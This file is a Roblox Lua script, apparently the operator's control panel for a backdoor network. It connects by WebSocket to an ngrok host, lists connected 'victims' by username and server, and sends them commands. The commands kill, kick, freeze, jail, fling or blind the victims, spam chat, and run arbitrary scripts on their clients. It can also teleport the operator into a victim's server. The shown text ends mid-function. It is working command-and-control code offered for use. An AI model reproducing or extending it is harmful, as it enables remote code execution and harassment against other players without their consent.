-- - Control panel
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local LocalPlayer = Players.LocalPlayer or Players.PlayerAdded:Wait()

local WS_URL = "wss://upstairs-whenever-unveiled.ngrok-free.dev"

local WS_Connect = (WebSocket and WebSocket.connect)
    or (websocket and websocket.connect)
    or (syn and syn.websocket and syn.websocket.connect)
    or (getgenv and getgenv().WebSocket and getgenv().WebSocket.connect)
    or (getgenv and getgenv().websocket and getgenv().websocket.connect)

local connectedVictims = {}
local selectedVictim = "TODOS"
local wsConnected = false
local currentSocket = nil
local isHopping = false

local safeParent = (pcall(function() return game:GetService("CoreGui") end) and game:GetService("CoreGui"))
    or LocalPlayer:WaitForChild("PlayerGui")

pcall(function()
    local old = safeParent:FindFirstChild("SacredMasterGui")
    if old then old:Destroy() end
    local old2 = safeParent:FindFirstChild("ScreenGui")
    if old2 and old2:FindFirstChild("UIprincipal frame") then old2:Destroy() end
    local pg = LocalPlayer:FindFirstChild("PlayerGui")
    if pg then
        local old3 = pg:FindFirstChild("SacredMasterGui")
        if old3 then old3:Destroy() end
        local old4 = pg:FindFirstChild("ScreenGui")
        if old4 and old4:FindFirstChild("UIprincipal frame") then old4:Destroy() end
    end
end)

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "SacredMasterGui"
ScreenGui.ResetOnSpawn = false
ScreenGui.IgnoreGuiInset = true
ScreenGui.DisplayOrder = 999999
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.Parent = safeParent

-- Helper function for dragging
local function makeDraggable(dragHandle, targetFrame)
    local dragging = false
    local dragInput, dragStart, startPos

    dragHandle.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = input.Position
            startPos = targetFrame.Position
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragging = false
                end
            end)
        end
    end)

    dragHandle.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
            dragInput = input
        end
    end)

    UserInputService.InputChanged:Connect(function(input)
        if input == dragInput and dragging then
            local delta = input.Position - dragStart
            targetFrame.Position = UDim2.new(
                startPos.X.Scale,
                startPos.X.Offset + delta.X,
                startPos.Y.Scale,
                startPos.Y.Offset + delta.Y
            )
        end
    end)
end

-- Main UI Frame
local Frame_1920 = Instance.new("Frame")
Frame_1920.Parent = ScreenGui
Frame_1920.Name = "UIprincipal frame"
Frame_1920.Size = UDim2.new(0, 541, 0, 279)
Frame_1920.Position = UDim2.new(0.5, -270, 0.5, -140)
Frame_1920.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame_1920.BorderSizePixel = 0
Frame_1920.Active = true
Frame_1920.Visible = true

makeDraggable(Frame_1920, Frame_1920)

-- Background Picture
local ImageLabel_4693 = Instance.new("ImageLabel")
ImageLabel_4693.Parent = Frame_1920
ImageLabel_4693.Name = "ui picture bg"
ImageLabel_4693.Size = UDim2.new(0, 541, 0, 279)
ImageLabel_4693.Position = UDim2.new(0, 0, 0, 0)
ImageLabel_4693.Image = "rbxassetid://82186004054702"
pcall(function() ImageLabel_4693.ImageContent = Content.fromUri("rbxassetid://82186004054702") end)
ImageLabel_4693.ScaleType = Enum.ScaleType.Stretch
ImageLabel_4693.BorderSizePixel = 0
ImageLabel_4693.BackgroundColor3 = Color3.fromRGB(255, 255, 255)

-- UI Title
local TextLabel_3320 = Instance.new("TextLabel")
TextLabel_3320.Parent = Frame_1920
TextLabel_3320.Name = "ui tittle"
TextLabel_3320.Size = UDim2.new(0, 242, 0, 55)
TextLabel_3320.Position = UDim2.new(0, 0, 0, 0)
TextLabel_3320.Text = "HOLY SHIT"
TextLabel_3320.TextSize = 60
TextLabel_3320.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_3320.Font = Enum.Font.Kalam
pcall(function() TextLabel_3320.FontFace = Font.new("rbxasset://fonts/families/Kalam.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal) end)
TextLabel_3320.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_3320.BackgroundTransparency = 0.2
TextLabel_3320.BorderSizePixel = 0
TextLabel_3320.Active = true

local TitleCorner = Instance.new("UICorner")
TitleCorner.CornerRadius = UDim.new(0, 8)
TitleCorner.Parent = TextLabel_3320

makeDraggable(TextLabel_3320, Frame_1920)

-- Credits & Status Label
local TextLabel = Instance.new("TextLabel")
TextLabel.Parent = Frame_1920
TextLabel.Name = "TextLabel"
TextLabel.Size = UDim2.new(0, 141, 0, 37)
TextLabel.Position = UDim2.new(0, 0, 0.1577, 0)
TextLabel.Text = "Conectando..."
TextLabel.TextSize = 18
TextLabel.TextColor3 = Color3.fromRGB(255, 215, 0)
TextLabel.Font = Enum.Font.Kalam
pcall(function() TextLabel.FontFace = Font.new("rbxasset://fonts/families/Kalam.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal) end)
TextLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.BackgroundTransparency = 0.2
TextLabel.BorderSizePixel = 0

local CreditsCorner = Instance.new("UICorner")
CreditsCorner.CornerRadius = UDim.new(0, 8)
CreditsCorner.Parent = TextLabel

local function setStatus(text, color)
    pcall(function()
        TextLabel.Text = text
        if color then TextLabel.TextColor3 = color end
    end)
end

-- Close Button (ImageButton)
local ImageButton_Close = Instance.new("ImageButton")
ImageButton_Close.Parent = Frame_1920
ImageButton_Close.Name = "close button (make the ui close when pressed)"
ImageButton_Close.Size = UDim2.new(0, 44, 0, 30)
ImageButton_Close.Position = UDim2.new(0.918669, 0, 0, 0)
ImageButton_Close.Image = "rbxassetid://131316225786073"
pcall(function() ImageButton_Close.ImageContent = Content.fromUri("rbxassetid://131316225786073") end)
ImageButton_Close.ScaleType = Enum.ScaleType.Stretch
ImageButton_Close.BorderSizePixel = 0
ImageButton_Close.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageButton_Close.BackgroundTransparency = 0

-- Minimized Button (ImageButton)
local ImageButton_Mini = Instance.new("ImageButton")
ImageButton_Mini.Parent = Frame_1920
ImageButton_Mini.Name = "Minimized (minimized ui into a toggle in the top left el bg del toggle es la foto del bg)"
ImageButton_Mini.Size = UDim2.new(0, 44, 0, 30)
ImageButton_Mini.Position = UDim2.new(0.837338, 0, 0, 0)
ImageButton_Mini.Image = "rbxassetid://95483605664204"
pcall(function() ImageButton_Mini.ImageContent = Content.fromUri("rbxassetid://95483605664204") end)
ImageButton_Mini.ScaleType = Enum.ScaleType.Stretch
ImageButton_Mini.BorderSizePixel = 0
ImageButton_Mini.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageButton_Mini.BackgroundTransparency = 0

-- Toggle button in the top left (user specified: toggle with bg image)
local ToggleButton = Instance.new("ImageButton")
ToggleButton.Name = "SacredToggleTopLeft"
ToggleButton.Parent = ScreenGui
ToggleButton.Size = UDim2.new(0, 46, 0, 46)
ToggleButton.Position = UDim2.new(0, 14, 0, 14)
ToggleButton.Image = "rbxassetid://82186004054702"
ToggleButton.ScaleType = Enum.ScaleType.Stretch
ToggleButton.BorderSizePixel = 0
ToggleButton.Visible = false
ToggleButton.Active = true

local ToggleCorner = Instance.new("UICorner")
ToggleCorner.CornerRadius = UDim.new(0, 10)
ToggleCorner.Parent = ToggleButton

local ToggleStroke = Instance.new("UIStroke")
ToggleStroke.Color = Color3.fromRGB(255, 255, 255)
ToggleStroke.Thickness = 2
ToggleStroke.Parent = ToggleButton

makeDraggable(ToggleButton, ToggleButton)

ImageButton_Close.MouseButton1Click:Connect(function()
    Frame_1920.Visible = false
    ToggleButton.Visible = true
end)

ImageButton_Mini.MouseButton1Click:Connect(function()
    Frame_1920.Visible = false
    ToggleButton.Visible = true
end)

ToggleButton.MouseButton1Click:Connect(function()
    Frame_1920.Visible = true
    ToggleButton.Visible = false
end)

----------------------------------------------------
-- TAB 1: PLAYER LIST
----------------------------------------------------
local TextButton_7220 = Instance.new("TextButton")
TextButton_7220.Parent = Frame_1920
TextButton_7220.Name = "List button selection (Player list frame)"
TextButton_7220.Size = UDim2.new(0, 100, 0, 27)
TextButton_7220.Position = UDim2.new(0.036968, 0, 0.867383, 0)
TextButton_7220.Text = "LIST"
TextButton_7220.TextSize = 25
TextButton_7220.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_7220.Font = Enum.Font.Kalam
pcall(function() TextButton_7220.FontFace = Font.new("rbxasset://fonts/families/Kalam.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal) end)
TextButton_7220.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
TextButton_7220.BorderSizePixel = 0

local Tab1Corner = Instance.new("UICorner")
Tab1Corner.CornerRadius = UDim.new(0, 8)
Tab1Corner.Parent = TextButton_7220

local Frame_4248 = Instance.new("Frame")
Frame_4248.Parent = TextButton_7220
Frame_4248.Name = "Player list"
Frame_4248.Size = UDim2.new(0, 541, 0, 153)
Frame_4248.Position = UDim2.new(-0.2, 0, -5.962963, 0)
Frame_4248.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Frame_4248.BackgroundTransparency = 0.2
Frame_4248.BorderSizePixel = 0
Frame_4248.Visible = true

local TextLabel_3205 = Instance.new("TextLabel")
TextLabel_3205.Parent = Frame_4248
TextLabel_3205.Name = "player list tittle"
TextLabel_3205.Size = UDim2.new(0, 360, 0, 45)
TextLabel_3205.Position = UDim2.new(0.08, 0, 0, 0)
TextLabel_3205.Text = "Player List (Target: TODOS | 0 Online)"
TextLabel_3205.TextSize = 24
TextLabel_3205.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_3205.Font = Enum.Font.Kalam
pcall(function() TextLabel_3205.FontFace = Font.new("rbxasset://fonts/families/Kalam.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal) end)
TextLabel_3205.BackgroundTransparency = 1

local TextButton_2336 = Instance.new("TextButton")
TextButton_2336.Parent = Frame_4248
TextButton_2336.Name = "Refresh player list (real time)"
TextButton_2336.Size = UDim2.new(0, 88, 0, 26)
TextButton_2336.Position = UDim2.new(0.78, 0, 0.05, 0)
TextButton_2336.Text = "Refresh"
TextButton_2336.TextSize = 22
TextButton_2336.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_2336.Font = Enum.Font.Kalam
pcall(function() TextButton_2336.FontFace = Font.new("rbxasset://fonts/families/Kalam.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal) end)
TextButton_2336.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton_2336.BackgroundTransparency = 0.2
TextButton_2336.BorderSizePixel = 0

local RefreshCorner = Instance.new("UICorner")
RefreshCorner.CornerRadius = UDim.new(0, 8)
RefreshCorner.Parent = TextButton_2336

local ScrollingFrame_2194 = Instance.new("ScrollingFrame")
ScrollingFrame_2194.Parent = Frame_4248
ScrollingFrame_2194.Name = "player list scrolling"
ScrollingFrame_2194.Size = UDim2.new(1, -20, 0, 108)
ScrollingFrame_2194.Position = UDim2.new(0, 10, 0, 42)
ScrollingFrame_2194.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
ScrollingFrame_2194.BackgroundTransparency = 0.6
ScrollingFrame_2194.BorderSizePixel = 0
ScrollingFrame_2194.ScrollBarThickness = 8
ScrollingFrame_2194.CanvasSize = UDim2.new(0, 0, 0, 0)
ScrollingFrame_2194.ScrollingDirection = Enum.ScrollingDirection.Y
ScrollingFrame_2194.AutomaticCanvasSize = Enum.AutomaticSize.None

local VictimsLayout = Instance.new("UIListLayout")
VictimsLayout.Padding = UDim.new(0, 4)
VictimsLayout.SortOrder = Enum.SortOrder.LayoutOrder
VictimsLayout.Parent = ScrollingFrame_2194

----------------------------------------------------
-- TAB 2: COMMANDS
----------------------------------------------------
local TextButton_3592 = Instance.new("TextButton")
TextButton_3592.Parent = Frame_1920
TextButton_3592.Name = "commands button selection (commands frame)"
TextButton_3592.Size = UDim2.new(0, 100, 0, 27)
TextButton_3592.Position = UDim2.new(0.262476, 0, 0.867383, 0)
TextButton_3592.Text = "Commands"
TextButton_3592.TextSize = 25
TextButton_3592.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_3592.Font = Enum.Font.Kalam
pcall(function() TextButton_3592.FontFace = Font.new("rbxasset://fonts/families/Kalam.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal) end)
TextButton_3592.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton_3592.BorderSizePixel = 0

local Tab2Corner = Instance.new("UICorner")
Tab2Corner.CornerRadius = UDim.new(0, 8)
Tab2Corner.Parent = TextButton_3592

local commands = Instance.new("Frame")
commands.Parent = TextButton_3592
commands.Name = "commands"
commands.Size = UDim2.new(0, 541, 0, 153)
commands.Position = UDim2.new(-1.42, 0, -5.963, 0)
commands.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
commands.BackgroundTransparency = 0.6
commands.BorderSizePixel = 0
commands.Visible = false

local TextLabel_6763 = Instance.new("TextLabel")
TextLabel_6763.Parent = commands
TextLabel_6763.Name = "commands tittle"
TextLabel_6763.Size = UDim2.new(0, 200, 0, 36)
TextLabel_6763.Position = UDim2.new(0.366, 0, -0.02, 0)
TextLabel_6763.Text = "Commands"
TextLabel_6763.TextSize = 36
TextLabel_6763.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_6763.Font = Enum.Font.Kalam
pcall(function() TextLabel_6763.FontFace = Font.new("rbxasset://fonts/families/Kalam.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal) end)
TextLabel_6763.BackgroundTransparency = 1

local function createCmdBtn(name, text, xPos, yPos)
    local b = Instance.new("TextButton")
    b.Parent = commands
    b.Name = name
    b.Size = UDim2.new(0, 127, 0, 27)
    b.Position = UDim2.new(xPos, 0, yPos, 0)
    b.Text = text
    b.TextSize = 22
    b.TextColor3 = Color3.fromRGB(255, 255, 255)
    b.Font = Enum.Font.Kalam
    pcall(function() b.FontFace = Font.new("rbxasset://fonts/families/Kalam.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal) end)
    b.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    b.BackgroundTransparency = 0.2
    b.BorderSizePixel = 0
    local c = Instance.new("UICorner")
    c.CornerRadius = UDim.new(0, 8)
    c.Parent = b
    return b
end

-- Col 1
local TextButton_4400 = createCmdBtn("reset player", "Kill (reset)", 0.0258, 0.2156)
local explotion = createCmdBtn("explotion", "Explotion", 0.0258, 0.4117)
local TextButton_2313 = createCmdBtn("kick player", "Kick Player", 0.0258, 0.6143)
local jumpscare = createCmdBtn("jumpscare", "Jumpscare", 0.0258, 0.8235)

-- Col 2
local TextButton_3709 = createCmdBtn("bring player", "Bring Player", 0.278, 0.2156)
local frezee = createCmdBtn("frezee", "Freeze", 0.278, 0.4117)
local unfrezee = createCmdBtn("unfrezee", "Unfreeze", 0.278, 0.6143)
local jail = createCmdBtn("jail", "Jail", 0.278, 0.8235)

-- Col 3
local TextButton_9166 = createCmdBtn("remove jail", "Remove Jail", 0.525, 0.2156)
local TextButton_3274 = createCmdBtn("invert control", "Invert Controls", 0.525, 0.4117)
local TextButton_9884 = createCmdBtn("uninvert control", "Uninvert", 0.525, 0.6143)
local fling = createCmdBtn("fling", "Fling", 0.525, 0.8235)

-- Col 4
local TextButton_2026 = createCmdBtn("slow speed", "Slow Speed", 0.765, 0.2156)
local TextButton_5783 = createCmdBtn("fast speed", "Fast Speed", 0.765, 0.4117)
local TextButton_5465 = createCmdBtn("normal speed", "Normal Speed", 0.765, 0.6143)
local blackscreen = createCmdBtn("blackscreen", "Black Screen", 0.765, 0.8235)

----------------------------------------------------
-- TAB 3: EXEC OP
----------------------------------------------------
local TextButton_8332 = Instance.new("TextButton")
TextButton_8332.Parent = Frame_1920
TextButton_8332.Name = "Exec Op button selection (exec op frame)"
TextButton_8332.Size = UDim2.new(0, 100, 0, 27)
TextButton_8332.Position = UDim2.new(0.491682, 0, 0.867383, 0)
TextButton_8332.Text = "Exec Op"
TextButton_8332.TextSize = 25
TextButton_8332.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_8332.Font = Enum.Font.Kalam
pcall(function() TextButton_8332.FontFace = Font.new("rbxasset://fonts/families/Kalam.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal) end)
TextButton_8332.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton_8332.BorderSizePixel = 0

local Tab3Corner = Instance.new("UICorner")
Tab3Corner.CornerRadius = UDim.new(0, 8)
Tab3Corner.Parent = TextButton_8332

local Frame_5178 = Instance.new("Frame")
Frame_5178.Parent = TextButton_8332
Frame_5178.Name = "exec op"
Frame_5178.Size = UDim2.new(0, 541, 0, 153)
Frame_5178.Position = UDim2.new(-2.66, 0, -5.962963, 0)
Frame_5178.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Frame_5178.BackgroundTransparency = 0.2
Frame_5178.BorderSizePixel = 0
Frame_5178.Visible = false

-- Col 1: Message (Screen Alert)
local TextLabel_6869 = Instance.new("TextLabel")
TextLabel_6869.Parent = Frame_5178
TextLabel_6869.Name = "message tittle"
TextLabel_6869.Size = UDim2.new(0, 140, 0, 36)
TextLabel_6869.Position = UDim2.new(0.04, 0, 0.05, 0)
TextLabel_6869.Text = "Message"
TextLabel_6869.TextSize = 34
TextLabel_6869.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_6869.Font = Enum.Font.Kalam
pcall(function() TextLabel_6869.FontFace = Font.new("rbxasset://fonts/families/Kalam.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal) end)
TextLabel_6869.BackgroundTransparency = 1

local message = Instance.new("TextBox")
message.Parent = Frame_5178
message.Name = "message"
message.Size = UDim2.new(0, 150, 0, 38)
message.Position = UDim2.new(0.03, 0, 0.38, 0)
message.Text = "DARLING ON TOP!"
message.TextSize = 20
message.TextColor3 = Color3.fromRGB(255, 50, 50)
message.Font = Enum.Font.Kalam
pcall(function() message.FontFace = Font.new("rbxasset://fonts/families/Kalam.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal) end)
message.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
message.BackgroundTransparency = 0.4
message.BorderSizePixel = 0
message.ClearTextOnFocus = false

local MsgBoxCorner = Instance.new("UICorner")
MsgBoxCorner.CornerRadius = UDim.new(0, 8)
MsgBoxCorner.Parent = message

local TextButton_8449 = Instance.new("TextButton")
TextButton_8449.Parent = Frame_5178
TextButton_8449.Name = "send message button"
TextButton_8449.Size = UDim2.new(0, 110, 0, 27)
TextButton_8449.Position = UDim2.new(0.07, 0, 0.72, 0)
TextButton_8449.Text = "Send"
TextButton_8449.TextSize = 24
TextButton_8449.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_8449.Font = Enum.Font.Kalam
pcall(function() TextButton_8449.FontFace = Font.new("rbxasset://fonts/families/Kalam.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal) end)
TextButton_8449.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton_8449.BackgroundTransparency = 0.2
TextButton_8449.BorderSizePixel = 0

local MsgBtnCorner = Instance.new("UICorner")
MsgBtnCorner.CornerRadius = UDim.new(0, 8)
MsgBtnCorner.Parent = TextButton_8449

-- Col 2: Chat Spam
local TextLabel_5348 = Instance.new("TextLabel")
TextLabel_5348.Parent = Frame_5178
TextLabel_5348.Name = "chat spam tittle"
TextLabel_5348.Size = UDim2.new(0, 140, 0, 36)
TextLabel_5348.Position = UDim2.new(0.37, 0, 0.05, 0)
TextLabel_5348.Text = "Chat Spam"
TextLabel_5348.TextSize = 34
TextLabel_5348.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_5348.Font = Enum.Font.Kalam
pcall(function() TextLabel_5348.FontFace = Font.new("rbxasset://fonts/families/Kalam.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal) end)
TextLabel_5348.BackgroundTransparency = 1

local chatBox = Instance.new("TextBox")
chatBox.Parent = Frame_5178
chatBox.Name = "chat spam box"
chatBox.Size = UDim2.new(0, 150, 0, 38)
chatBox.Position = UDim2.new(0.36, 0, 0.38, 0)
chatBox.Text = "DARLING ON TOP!"
chatBox.TextSize = 20
chatBox.TextColor3 = Color3.fromRGB(255, 255, 100)
chatBox.Font = Enum.Font.Kalam
pcall(function() chatBox.FontFace = Font.new("rbxasset://fonts/families/Kalam.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal) end)
chatBox.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
chatBox.BackgroundTransparency = 0.4
chatBox.BorderSizePixel = 0
chatBox.ClearTextOnFocus = false

local ChatBoxCorner = Instance.new("UICorner")
ChatBoxCorner.CornerRadius = UDim.new(0, 8)
ChatBoxCorner.Parent = chatBox

local chatSendBtn = Instance.new("TextButton")
chatSendBtn.Parent = Frame_5178
chatSendBtn.Name = "send chat spam button"
chatSendBtn.Size = UDim2.new(0, 110, 0, 27)
chatSendBtn.Position = UDim2.new(0.40, 0, 0.72, 0)
chatSendBtn.Text = "Send"
chatSendBtn.TextSize = 24
chatSendBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
chatSendBtn.Font = Enum.Font.Kalam
pcall(function() chatSendBtn.FontFace = Font.new("rbxasset://fonts/families/Kalam.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal) end)
chatSendBtn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
chatSendBtn.BackgroundTransparency = 0.2
chatSendBtn.BorderSizePixel = 0

local ChatBtnCorner = Instance.new("UICorner")
ChatBtnCorner.CornerRadius = UDim.new(0, 8)
ChatBtnCorner.Parent = chatSendBtn

-- Col 3: Exec Script
local TextLabel_4366 = Instance.new("TextLabel")
TextLabel_4366.Parent = Frame_5178
TextLabel_4366.Name = "exec script tittle"
TextLabel_4366.Size = UDim2.new(0, 140, 0, 36)
TextLabel_4366.Position = UDim2.new(0.70, 0, 0.05, 0)
TextLabel_4366.Text = "Exec Script"
TextLabel_4366.TextSize = 34
TextLabel_4366.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_4366.Font = Enum.Font.Kalam
pcall(function() TextLabel_4366.FontFace = Font.new("rbxasset://fonts/families/Kalam.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal) end)
TextLabel_4366.BackgroundTransparency = 1

local scriptBox = Instance.new("TextBox")
scriptBox.Parent = Frame_5178
scriptBox.Name = "exec script box"
scriptBox.Size = UDim2.new(0, 150, 0, 38)
scriptBox.Position = UDim2.new(0.69, 0, 0.38, 0)
scriptBox.Text = "print('Sacred Master')"
scriptBox.TextSize = 14
scriptBox.TextColor3 = Color3.fromRGB(120, 255, 160)
scriptBox.Font = Enum.Font.Code
scriptBox.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
scriptBox.BackgroundTransparency = 0.4
scriptBox.BorderSizePixel = 0
scriptBox.ClearTextOnFocus = false

local ScriptBoxCorner = Instance.new("UICorner")
ScriptBoxCorner.CornerRadius = UDim.new(0, 8)
ScriptBoxCorner.Parent = scriptBox

local scriptSendBtn = Instance.new("TextButton")
scriptSendBtn.Parent = Frame_5178
scriptSendBtn.Name = "send script button"
scriptSendBtn.Size = UDim2.new(0, 110, 0, 27)
scriptSendBtn.Position = UDim2.new(0.73, 0, 0.72, 0)
scriptSendBtn.Text = "Send"
scriptSendBtn.TextSize = 24
scriptSendBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
scriptSendBtn.Font = Enum.Font.Kalam
pcall(function() scriptSendBtn.FontFace = Font.new("rbxasset://fonts/families/Kalam.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal) end)
scriptSendBtn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
scriptSendBtn.BackgroundTransparency = 0.2
scriptSendBtn.BorderSizePixel = 0

local ScriptBtnCorner = Instance.new("UICorner")
ScriptBtnCorner.CornerRadius = UDim.new(0, 8)
ScriptBtnCorner.Parent = scriptSendBtn

----------------------------------------------------
-- TAB SWITCHING (DEFAULT: PLAYER LIST)
----------------------------------------------------
local function switchTab(tabIndex)
    Frame_4248.Visible = (tabIndex == 1)
    commands.Visible = (tabIndex == 2)
    Frame_5178.Visible = (tabIndex == 3)

    TextButton_7220.BackgroundColor3 = (tabIndex == 1) and Color3.fromRGB(50, 50, 50) or Color3.fromRGB(0, 0, 0)
    TextButton_3592.BackgroundColor3 = (tabIndex == 2) and Color3.fromRGB(50, 50, 50) or Color3.fromRGB(0, 0, 0)
    TextButton_8332.BackgroundColor3 = (tabIndex == 3) and Color3.fromRGB(50, 50, 50) or Color3.fromRGB(0, 0, 0)
end

TextButton_7220.MouseButton1Click:Connect(function() switchTab(1) end)
TextButton_3592.MouseButton1Click:Connect(function() switchTab(2) end)
TextButton_8332.MouseButton1Click:Connect(function() switchTab(3) end)

-- Set default tab to Player list
switchTab(1)

----------------------------------------------------
-- WEBSOCKET & COMMAND LOGIC
----------------------------------------------------
local rebuildVictimsUI = nil

local isConnecting = false
local function connectWS()
    if isConnecting then return end
    isConnecting = true

    pcall(function()
        if currentSocket then currentSocket:Close() end
    end)
    currentSocket = nil
    wsConnected = false

    if not WS_Connect then
        setStatus("Sin WS", Color3.fromRGB(255, 170, 0))
        isConnecting = false
        return false
    end

    local ok, s = pcall(function() return WS_Connect(WS_URL) end)
    if ok and s then
        currentSocket = s
        wsConnected = true
        setStatus("Online", Color3.fromRGB(80, 255, 120))

        local function onMsg(msg)
            local success, data = pcall(function() return HttpService:JSONDecode(msg) end)
            if success and data then
                if (data.type == "victim_joined" or data.type == "victim_ping") and data.username then
                    connectedVictims[data.username] = {
                        username = data.username,
                        placeId = data.placeId,
                        gameId = data.gameId,
                        jobId = data.jobId,
                        lastSeen = tick()
                    }
                    if rebuildVictimsUI then rebuildVictimsUI() end
                elseif data.type == "cmd_ack" then
                    setStatus("Ack: " .. tostring(data.username), Color3.fromRGB(80, 255, 120))
                end
            end
        end

        pcall(function() s.OnMessage:Connect(onMsg) end)
        pcall(function() s.OnMessage:connect(onMsg) end)
        pcall(function() s.onmessage = onMsg end)
        pcall(function() s.OnMessage = onMsg end)

        local function onClose()
            wsConnected = false
            currentSocket = nil
            setStatus("Offline", Color3.fromRGB(255, 100, 100))
        end

        pcall(function() s.OnClose:Connect(onClose) end)
        pcall(function() s.OnClose:connect(onClose) end)
        pcall(function() s.onclose = onClose end)
        pcall(function() s.OnClose = onClose end)

        pcall(function()
            s:Send(HttpService:JSONEncode({type = "ping_victims"}))
        end)

        isConnecting = false
        return true
    end

    wsConnected = false
    setStatus("Offline", Color3.fromRGB(255, 100, 100))
    isConnecting = false
    return false
end

local function hopServer(placeId, jobId)
    if isHopping then return end
    local pid = tonumber(placeId)
    local jid = tostring(jobId or "")
    if not pid or jid == "" or #jid < 5 then
        setStatus("Sin JobId", Color3.fromRGB(255, 170, 0))
        return
    end

    isHopping = true
    setStatus("Entrando...", Color3.fromRGB(140, 200, 255))

    task.spawn(function()
        if game.PlaceId == pid then
            pcall(function()
                TeleportService:TeleportToPlaceInstance(pid, jid, LocalPlayer)
            end)
        else
            pcall(function()
                TeleportService:Teleport(pid, LocalPlayer)
            end)
        end
        task.wait(5)
        isHopping = false
        if not wsConnected or not currentSocket then
            connectWS()
        end
    end)
end

local function sendCmd(action, extra)
    if not wsConnected or not currentSocket then
        connectWS()
        local waited = 0
        while (not wsConnected or not currentSocket) and waited < 3 do
            task.wait(0.2)
            waited = waited + 0.2
        end
    end
    if not currentSocket or not wsConnected then
        setStatus("Desconectado", Color3.fromRGB(255, 100, 100))
        return false
    end
    local cmdId = tostring(os.time()) .. "_" .. tostring(math.random(100000, 999999))
    local payload = {
        type = "master_command",
        action = action,
        target = selectedVictim,
        cmd_id = cmdId
    }
    if extra then
        for k, v in pairs(extra) do payload[k] = v end
    end
    local raw = HttpService:JSONEncode(payload)
    local ok = pcall(function() currentSocket:Send(raw) end)
    if not ok then
        wsConnected = false
        currentSocket = nil
        connectWS()
        task.wait(0.3)
        if currentSocket and wsConnected then
            pcall(function() currentSocket:Send(raw) end)
        end
    end
    return ok
end

----------------------------------------------------
-- DYNAMIC VICTIMS LIST
----------------------------------------------------
rebuildVictimsUI = function()
    for _, c in ipairs(ScrollingFrame_2194:GetChildren()) do
        if c:IsA("Frame") or c:IsA("TextLabel") or (c:IsA("TextButton") and c.Name:find("VictimCard_")) then
            c:Destroy()
        end
    end

    local victimCount = 0
    for _ in pairs(connectedVictims) do
        victimCount = victimCount + 1
    end

    TextLabel_3205.Text = string.format("Player List (Target: %s | %d Online)", tostring(selectedVictim), victimCount)

    -- Card 0: TODOS
    local isTodosSelected = (selectedVictim == "TODOS")
    local allCard = Instance.new("Frame")
    allCard.Name = "VictimCard_00_TODOS"
    allCard.LayoutOrder = 1
    allCard.Size = UDim2.new(1, -6, 0, 32)
    allCard.BackgroundColor3 = isTodosSelected and Color3.fromRGB(50, 40, 70) or Color3.fromRGB(20, 20, 25)
    allCard.BackgroundTransparency = 0.2
    allCard.BorderSizePixel = 0
    allCard.Parent = ScrollingFrame_2194

    local allCorner = Instance.new("UICorner")
    allCorner.CornerRadius = UDim.new(0, 6)
    allCorner.Parent = allCard

    local allLabel = Instance.new("TextLabel")
    allLabel.Size = UDim2.new(0, 260, 1, 0)
    allLabel.Position = UDim2.new(0, 10, 0, 0)
    allLabel.BackgroundTransparency = 1
    allLabel.Text = "TODOS (All Connected Victims)"
    allLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    allLabel.Font = Enum.Font.Kalam
    allLabel.TextSize = 20
